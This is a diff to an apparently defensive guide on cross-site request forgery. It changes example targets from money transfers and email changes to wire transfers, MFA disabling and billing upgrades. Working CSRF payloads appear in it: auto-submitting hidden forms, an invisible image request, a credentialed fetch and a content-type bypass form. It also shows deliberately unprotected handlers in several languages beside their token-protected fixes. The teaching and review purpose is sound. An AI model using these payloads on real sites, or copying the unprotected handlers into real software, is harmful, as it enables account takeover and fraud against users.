@@ -37,9 +37,9 @@ Use these in authorized tests when a state-changing endpoint trusts session cook
 ### Pattern 1: Hidden auto-submit form (classic CSRF)
 
 ```html
-<form action="https://bank.example/transfer" method="POST" id="csrf">
-  <input type="hidden" name="to" value="attacker-acct">
-  <input type="hidden" name="amount" value="10000">
+<form action="https://bank.example/wire" method="POST" id="csrf">
+  <input type="hidden" name="beneficiary" value="attacker-acct">
+  <input type="hidden" name="amount" value="25000">
 </form>
 <script>document.getElementById('csrf').submit();</script>
 ```
@@ -47,32 +47,32 @@ Use these in authorized tests when a state-changing endpoint trusts session cook
 ### Pattern 2: GET mutation (unsafe side effect)
 
 ```html
-<img src="https://app.example/admin/delete?userId=42" width="0" height="0">
+<img src="https://app.example/admin/revoke?keyId=7" width="0" height="0">
 ```
 
 ### Pattern 3: `fetch` with cookies (cookie-authenticated API)
 
 ```javascript
-fetch('https://app.example/api/settings/email', {
+fetch('https://app.example/api/account/mfa/disable', {
   method: 'POST',
   credentials: 'include',
   headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ email: 'attacker@evil.example' })
+  body: JSON.stringify({ confirm: true })
 });
 ```
 
 ### Pattern 4: Cross-origin form to JSON endpoint (content-type bypass attempts)
 
 ```html
-<form action="https://app.example/api/role" method="POST" enctype="text/plain">
-  <input name='{"role":"admin","x":"' value='"}'>
+<form action="https://app.example/api/billing/plan" method="POST" enctype="text/plain">
+  <input name='{"plan":"enterprise","x":"' value='"}'>
 </form>
 ```
 
 ### Pattern 5: Multipart or file upload CSRF
 
 ```html
-<form action="https://app.example/api/avatar" method="POST" enctype="multipart/form-data">
+<form action="https://app.example/api/documents/upload" method="POST" enctype="multipart/form-data">
   <input type="file" name="file">
 </form>
 ```
@@ -150,15 +150,13 @@ from flask import Flask, request, redirect, session
 
 app = Flask(__name__)
 
-@app.route("/settings/email", methods=["POST"])
-def change_email():
+@app.route("/account/mfa/disable", methods=["POST"])
+def disable_mfa():
     if "user_id" not in session:
         return redirect("/login")
     # No CSRF token check; attacker site can POST with victim's cookies
-    new_email = request.form["email"]
-    db.execute("UPDATE users SET email = ? WHERE id = ?",
-               (new_email, session["user_id"]))
-    return "updated"
+    db.execute("UPDATE users SET mfa_enabled = 0 WHERE id = ?", (session["user_id"],))
+    return "MFA disabled"
 ```
 
 ## Step-by-Step Review Walkthrough
@@ -188,12 +186,12 @@ def change_email():
 ### Java
 
 ```java
-@PostMapping("/transfer")
-public String transfer(@RequestParam String toAccount,
-                       @RequestParam BigDecimal amount,
-                       HttpSession session) {
+@PostMapping("/wire")
+public String wireTransfer(@RequestParam String beneficiary,
+                           @RequestParam BigDecimal amount,
+                           HttpSession session) {
     User user = (User) session.getAttribute("user");
-    accountService.transfer(user, toAccount, amount);
+    wireService.send(user, beneficiary, amount);
     return "ok";
 }
 ```
@@ -202,10 +200,9 @@ public String transfer(@RequestParam String toAccount,
 
 ```csharp
 [HttpPost]
-[AllowAnonymous]
-public IActionResult PromoteUser(int userId, string role)
+public IActionResult DisableMfa()
 {
-    _userService.SetRole(userId, role);
+    _mfaService.Disable(UserId);
     return Ok();
 }
 ```
@@ -213,12 +210,11 @@ public IActionResult PromoteUser(int userId, string role)
 ### HTML
 
 ```html
-<!-- evil.example.com/transfer.html — victim's browser auto-POSTs with session cookies -->
+<!-- evil.example.com/disable-mfa.html — victim's browser auto-POSTs with session cookies -->
 <html>
   <body onload="document.forms[0].submit()">
-    <form action="https://bank.example.com/transfer" method="POST">
-      <input type="hidden" name="toAccount" value="attacker-acct"/>
-      <input type="hidden" name="amount" value="1000"/>
+    <form action="https://app.example/account/mfa/disable" method="POST">
+      <input type="hidden" name="confirm" value="true"/>
     </form>
   </body>
 </html>
@@ -228,21 +224,21 @@ public IActionResult PromoteUser(int userId, string role)
 
 ```javascript
 // SPA calls state-changing API with cookies only — no synchronizer token
-fetch('/api/admin/promote', {
+fetch('/api/billing/upgrade', {
   method: 'POST',
   credentials: 'include',
   headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ userId: 42, role: 'admin' }),
+  body: JSON.stringify({ plan: 'enterprise' }),
 });
 ```
 
 ### Go
 
 ```go
-func deleteAccount(w http.ResponseWriter, r *http.Request) {
+func disableMfa(w http.ResponseWriter, r *http.Request) {
     cookie, _ := r.Cookie("session")
     userID := sessions.Get(cookie.Value)
-    db.Exec("DELETE FROM users WHERE id = ?", userID)
+    db.Exec("UPDATE users SET mfa_enabled = false WHERE id = ?", userID)
     w.WriteHeader(http.StatusOK)
 }
 ```
@@ -263,22 +259,19 @@ app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
 app.config["SESSION_COOKIE_SECURE"] = True
 csrf = CSRFProtect(app)
 
-@app.route("/settings/email", methods=["POST"])
-def change_email():
+@app.route("/account/mfa/disable", methods=["POST"])
+def disable_mfa():
     if "user_id" not in session:
         return redirect("/login")
-    new_email = request.form["email"]
-    db.execute("UPDATE users SET email = ? WHERE id = ?",
-               (new_email, session["user_id"]))
-    return "updated"
+    db.execute("UPDATE users SET mfa_enabled = 0 WHERE id = ?", (session["user_id"],))
+    return "MFA disabled"
 ```
 
 ```html
-<!-- settings.html -->
+<!-- mfa_settings.html -->
 <form method="post">
   <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
-  <input name="email" type="email"/>
-  <button type="submit">Update</button>
+  <button type="submit">Disable MFA</button>
 </form>
 ```
 
@@ -289,24 +282,13 @@ def change_email():
 Spring Security enables CSRF by default for session-backed apps.
 
 ```java
-@PostMapping("/transfer")
-public String transfer(@RequestParam String toAccount,
-                       @RequestParam BigDecimal amount,
-                       HttpSession session) {
-    User user = (User) session.getAttribute("user");
-    accountService.transfer(user, toAccount, amount);
-    return "ok";
-}
-```
-
-```java
 // SecurityConfig — CSRF enabled (default); SPA header pattern:
 http.csrf(csrf -> csrf
     .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()));
 ```
 
 ```html
-<form action="/transfer" method="post">
+<form action="/wire" method="post">
   <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>
   <!-- fields -->
 </form>
@@ -321,18 +303,18 @@ Use anti-forgery tokens on MVC and Razor POST actions.
 ```csharp
 [HttpPost]
 [ValidateAntiForgeryToken]
-[Authorize(Roles = "Admin")]
-public IActionResult PromoteUser(int userId, string role)
+[Authorize]
+public IActionResult DisableMfa()
 {
-    _userService.SetRole(userId, role);
+    _mfaService.Disable(UserId);
     return Ok();
 }
 ```
 
 ```cshtml
-<form asp-action="PromoteUser" method="post">
+<form asp-action="DisableMfa" method="post">
   @Html.AntiForgeryToken()
-  <!-- fields -->
+  <button type="submit">Disable MFA</button>
 </form>
 ```
 
@@ -356,16 +338,16 @@ import (
 func main() {
     r := mux.NewRouter()
     csrfKey := []byte(os.Getenv("CSRF_KEY"))
-    r.HandleFunc("/account/delete", deleteAccount).Methods("POST")
+    r.HandleFunc("/account/mfa/disable", disableMfa).Methods("POST")
     http.ListenAndServe(":8080",
         csrf.Protect(csrfKey, csrf.Secure(true))(r))
 }
 ```
 
 ```html
-<form action="/account/delete" method="POST">
+<form action="/account/mfa/disable" method="POST">
   <input type="hidden" name="gorilla.csrf.Token" value="{{ .CSRFToken }}"/>
-  <button type="submit">Delete account</button>
+  <button type="submit">Disable MFA</button>
 </form>
 ```
 
